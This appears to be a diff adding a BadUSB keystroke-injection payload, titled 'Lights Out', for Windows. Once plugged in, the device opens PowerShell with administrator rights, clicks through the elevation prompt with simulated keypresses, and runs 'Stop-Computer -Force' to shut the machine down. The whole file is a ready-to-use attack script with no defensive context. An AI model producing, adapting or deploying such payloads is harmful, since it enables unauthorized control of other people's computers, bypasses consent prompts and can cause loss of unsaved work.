@@ -1,0 +1,35 @@
+REM	Title: Lights Out
+REM	Author: White_Wid0w
+REM	Description: uses powershell to turn off the device once plugged in
+
+REM	Target: Windows OS
+
+
+
+
+DELAY 500
+GUI r 
+DELAY 500 
+STRING powershell 
+CTRL-SHIFT ENTER
+DELAY 2000
+LEFTARROW
+DELAY 1000
+ENTER
+DELAY 6000
+STRING Stop-Computer -Force
+ENTER 
+LED FINISH
+
+
+
+
+
+
+
+
+
+
+
+
+
